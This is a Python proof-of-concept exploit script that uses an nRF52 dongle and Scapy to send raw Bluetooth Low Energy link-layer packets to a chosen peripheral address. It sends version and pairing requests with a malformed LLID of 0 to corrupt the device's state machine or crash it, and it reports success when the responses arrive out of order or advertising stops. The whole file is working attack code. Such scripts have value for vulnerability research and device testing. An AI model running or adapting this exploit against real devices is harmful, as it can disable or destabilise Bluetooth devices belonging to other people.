#!/usr/bin/python 
import os
import platform
import sys
from time import sleep

# libs
sys.path.insert(0, os.getcwd() + '/libs')
import colorama
from colorama import Fore
from drivers.NRF52_dongle import NRF52Dongle
from scapy.layers.bluetooth4LE import *
from scapy.layers.bluetooth import *
# timeout lib
from timeout_lib import start_timeout, disable_timeout, update_timeout

sleep(1.0)
# Default master address
master_address = '5d:36:ac:90:0b:22'
access_address = 0x9a328370
# Internal vars
none_count = 0
end_connection = False
connecting = False
pairing_sent = False
feature_req_sent = False
switch_version_req_llid = False
miss_connections = 0
slave_addr_type = 0
# Autoreset colors
colorama.init(autoreset=True)

# Get serial port from command line
if len(sys.argv) >= 2:
    serial_port = sys.argv[1]
elif platform.system() == 'Linux':
    serial_port = '/dev/ttyACM0'
elif platform.system() == 'Windows':
    serial_port = 'COM1'
else:
    print(Fore.RED + 'Platform not identified')
    sys.exit(0)

print(Fore.YELLOW + 'Serial port: ' + serial_port)

# Get advertiser_address from command line (peripheral addr)
if len(sys.argv) >= 3:
    advertiser_address = sys.argv[2].lower()
else:
    advertiser_address = '80:ea:ca:80:00:01'

print(Fore.YELLOW + 'Advertiser Address: ' + advertiser_address.upper())


def crash_timeout():
    print(Fore.RED + "No advertisement from " + advertiser_address.upper() +
          ' received\nThe device may have crashed!!!')


def scan_timeout():
    global connecting, miss_connections, slave_addr_type
    scan_req = BTLE() / BTLE_ADV(RxAdd=slave_addr_type) / BTLE_SCAN_REQ(
        ScanA=master_address,
        AdvA=advertiser_address)
    driver.send(scan_req)
    start_timeout('scan_timeout', 2, scan_timeout)
    if connecting:
        connecting = False
        miss_connections += 1
        if miss_connections >= 2:
            miss_connections = 0
            print(Fore.RED + 'Something wrong is happening\n'
                             'We are receiving advertisements but no connection is possible\n'
                             'Check if the connection parameters are allowed by peripheral\n'
                             'or optionally check if device works normally with a mobile app again.')


# Open serial port of NRF52 Dongle
driver = NRF52Dongle(serial_port, '115200')
# Send scan request
scan_req = BTLE() / BTLE_ADV(RxAdd=slave_addr_type) / BTLE_SCAN_REQ(
    ScanA=master_address,
    AdvA=advertiser_address)
driver.send(scan_req)

start_timeout('scan_timeout', 2, scan_timeout)

print(Fore.YELLOW + 'Waiting advertisements from ' + advertiser_address)
while True:
    pkt = None
    # Receive packet from the NRF52 Dongle
    data = driver.raw_receive()
    if data:
        # Decode Bluetooth Low Energy Data
        pkt = BTLE(data)
        # if packet is incorrectly decoded, you may not be using the dongle
        if pkt is None:
            none_count += 1
            if none_count >= 4:
                print(Fore.RED + 'NRF52 Dongle not detected')
                sys.exit(0)
            continue

        elif BTLE_DATA in pkt and BTLE_EMPTY_PDU not in pkt:
            update_timeout('scan_timeout')
            # Print slave data channel PDUs summary
            print(Fore.MAGENTA + "Slave RX <--- " + pkt.summary()[7:])

        # --------------- Process Link Layer Packets here ------------------------------------
        # Check if packet from advertised is received
        if pkt and (BTLE_SCAN_RSP in pkt or BTLE_ADV in pkt) and pkt.AdvA == advertiser_address.lower() and \
                connecting == False:
            connecting = True
            update_timeout('scan_timeout')
            disable_timeout('crash_timeout')
            slave_addr_type = pkt.TxAdd
            print(Fore.GREEN + advertiser_address.upper() + ': ' + pkt.summary()[7:] + ' Detected')
            # Send connection request to advertiser
            conn_request = BTLE() / BTLE_ADV(RxAdd=slave_addr_type, TxAdd=0) / BTLE_CONNECT_REQ(
                InitA=master_address,
                AdvA=advertiser_address,
                AA=access_address,  # Access address (any)
                crc_init=0x179a9c,  # CRC init (any)
                win_size=2,  # 2.5 of windows size (anchor connection window size)
                win_offset=1,  # 1.25ms windows offset (anchor connection point)
                interval=16,  # 20ms connection interval
                latency=0,  # Slave latency (any)
                timeout=50,  # Supervision timeout, 500ms (any)
                chM=0x1FFFFFFFFF,  # Any
                hop=5,  # Hop increment (any)
                SCA=0,  # Clock tolerance
            )
            # Yes, we're sending raw link layer messages in Python. Don't tell anyone as this is forbidden!!!
            driver.send(conn_request)
        elif BTLE_DATA in pkt and connecting == True:
            connecting = False
            feature_req_sent = False
            pairing_sent = False
            miss_connections = 0
            start_timeout('crash_timeout', 5, crash_timeout)

            print(Fore.GREEN + 'Slave Connected (L2Cap channel established)')
            # Send version indication request
            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_VERSION_IND(version='4.2')

            if not switch_version_req_llid:
                switch_version_req_llid = True
            else:
                pkt[BTLE_DATA].LLID = 0
                print(Fore.YELLOW + 'Sending version request with LLID = 0')
                switch_version_req_llid = False

            driver.send(pkt)  # send normal version request

        elif LL_VERSION_IND in pkt:
            # Send Feature request
            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_FEATURE_REQ(
                feature_set='le_encryption+le_data_len_ext')
            feature_req_sent = True
            driver.send(pkt)

        elif LL_FEATURE_RSP in pkt:
            if feature_req_sent:
                feature_req_sent = False
                pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_LENGTH_REQ(
                    max_tx_bytes=247 + 4, max_rx_bytes=247 + 4)
                driver.send(pkt)

            else:
                print(Fore.RED + 'Ooops, peripheral replied with a LL_FEATURE_RSP without corresponding request\n'
                                 'This means that the peripheral state machine was just corrupted!!!')
                exit(0)

        elif LL_LENGTH_RSP in pkt or LL_UNKNOWN_RSP in pkt:
            if not pairing_sent:
                pairing_req = BTLE(
                    access_addr=access_address) / BTLE_DATA() / L2CAP_Hdr() / SM_Hdr() / SM_Pairing_Request(
                    iocap=4, oob=0, authentication=0x05, max_key_size=16, initiator_key_distribution=0x07,
                    responder_key_distribution=0x07)

                if switch_version_req_llid:
                    pairing_req[BTLE_DATA].LLID = 0  # The magic happens here
                    print(Fore.YELLOW + 'Sending pairing request with LLID = 0')

                pairing_sent = True
                driver.send(pairing_req)  # Send pairing request with LLID = 0
            elif LL_UNKNOWN_RSP not in pkt:
                print(Fore.RED + 'Ooops, peripheral replied with a LL_FEATURE_RSP after we sent a pairing request\n'
                                 'This means that the peripheral state machine was just corrupted')
                exit(0)

        elif ATT_Read_By_Group_Type_Response in pkt or ATT_Exchange_MTU_Response in pkt:
            print(Fore.RED + "Oooops, device responded with an out of order ATT response "
                             "(we didn't send an ATT request)\n"
                             "This means that the peripheral state machine was just corrupted")
            print(Fore.YELLOW)
            exit(0)

        elif SM_Pairing_Response in pkt:
            pairing_req = BTLE(access_addr=access_address) / BTLE_DATA() / L2CAP_Hdr() / SM_Hdr() / SM_Public_Key()
            driver.send(pairing_req)

        elif LL_LENGTH_REQ in pkt:
            length_rsp = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_LENGTH_RSP(
                max_tx_bytes=247 + 4, max_rx_bytes=247 + 4)
            driver.send(length_rsp)  # Send a normal length response

        elif ATT_Find_By_Type_Value_Request in pkt:
            pkt = BTLE(
                access_addr=access_address) / BTLE_DATA() / L2CAP_Hdr() / ATT_Hdr() / ATT_Find_By_Type_Value_Response()
            driver.send(pkt)

    sleep(0.01)
